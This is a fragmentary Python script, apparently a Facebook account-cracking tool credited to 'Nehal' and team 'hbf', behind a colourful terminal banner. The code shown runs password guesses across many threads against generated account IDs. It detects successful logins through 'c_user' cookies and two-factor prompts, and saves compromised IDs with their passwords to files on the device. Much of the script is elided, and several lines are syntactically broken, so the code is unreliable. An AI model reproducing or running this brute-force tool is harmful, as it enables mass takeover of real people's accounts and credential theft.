#created by Nehal 
#team name hbf
#tottaly written by Nehal  360 Khawaja
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; Nehal  \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
Nehal Khan  = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
logo ="""     
 ...
 | . ` |/ _ \ '_ \ / _` | | |  < | '_ \ / _` | '_ \  
 | |\  |  __/ | | | (_| | | | . \| | | | (_| | | | | 
 |_| \_|\___|_| |_|\__,_|_| |_|\_\_| |_|\__,_|_| |_| 
                                                     
                                                     
                                                               
\033[1;37m╔\033[1;36mⓉⒷⒽ\033[1;37m════════════════════════════════════════════════════
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER    \033[1;31m    ➟   \033[1;32m꧁𓊈𒆜 NEHAL 𒆜𓊉꧂      \033[1;31m      ‌‌‌‌‌‌‌
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m ➟   \033[1;32m   Nehal khan       \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m    t.me/bothacker999    \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m   ➟   \033[1;32m    mind tom09    \033[1;31m   
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) Nehal 
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {Nehal T()} {WHITE}]")
    ...
    if Nehal  in ["1","01"]:
        ...
        os.system("xdg-open https://www.youtube.com/@Nehal -360")
        XYZ()
    elif Nehal  in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Nehal -OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Nehal -CP.txt')
...
def pass3():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}USER NAME             : {BLUE}"+Nehal Khan)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}======================================================')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio Nehal _OK.mp3")
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio Nehal _2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/Nehal -2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio Nehal _CP.mp3")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝐖𝐀𝐒𝐈𝐌 🔥] [%s] \33[1;97m[OK:%s{Nehal Khan }CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
